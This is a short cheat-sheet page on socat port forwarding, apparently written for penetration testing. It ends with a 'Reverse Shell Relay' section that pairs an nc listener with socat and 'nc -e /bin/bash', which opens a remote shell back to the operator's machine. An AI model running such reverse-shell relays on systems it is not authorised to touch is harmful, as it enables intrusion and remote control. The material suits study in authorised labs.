---
title: Port Forwarding with Socat
description: Socat is a multipurpose relay tool. It can be used to port forwarding.
tags:
    - Network
refs:
    - https://linuxize.com/post/how-to-setup-ssh-tunneling/
date: 2023-03-19
draft: false
---

## Port Forwarding

Run the following command in local machine.

```sh
socat tcp-listen:8080,fork tcp:<remote-ip>:80
```

With command above, we can access to **`http://localhost:8080/`** and get the content of the remote website.

<br />

## Port Forwarding (from Remote Machine)

Run the following command in remote machine.

```sh
socat tcp-listen:1234,fork,reuseaddr tcp:localhost:8080
```

With command above, we can access to **`http://<remote-ip>:1234`** in local machine, and get the content of the remote **8080** port.

<br />

## Quiet Port Forwarding

### 1. Open Up Two Ports in Local Machine

```sh
socat tcp-listen:<local-port> tcp-listen:<remote-port>,fork,reuseaddr &
```

### 2. Make a Connection between Local Port and Remote Port

In remote machine,

```sh
socat tcp:<local-ip>:<local-port> tcp:<remote-ip>:<remote-port>,fork &
```

### 3. Confirmation in Your Local Machine

For example, if **`<remote-port>`** is **8000 (HTTP)**, we can access to **`localhost:<remote-port>`**.

### 4. Stop Port Forwarding

```sh
# Stop backgrounds
jobs
# kill %<NUMBER>
kill %1
```

<br />

## Reverse Shell Relay

### 1. Open Listener in Your Local Machine

```sh
nc -lvnp <local-port>
```

### 2. Run Socat in Remote Machine

```sh
./socat tcp-l:8000 tcp:<local-ip>:<local-port> &
nc 127.0.0.1 8000 -e /bin/bash
```

### 3. Confirmation in Your Local Machine

You can connect the remote shell, confirm by some commands.

```sh
whoami
```

### 4. Stop Reverse Shell Relay

```sh
# Stop backgrounds
jobs
# kill %<NUMBER>
kill %1
```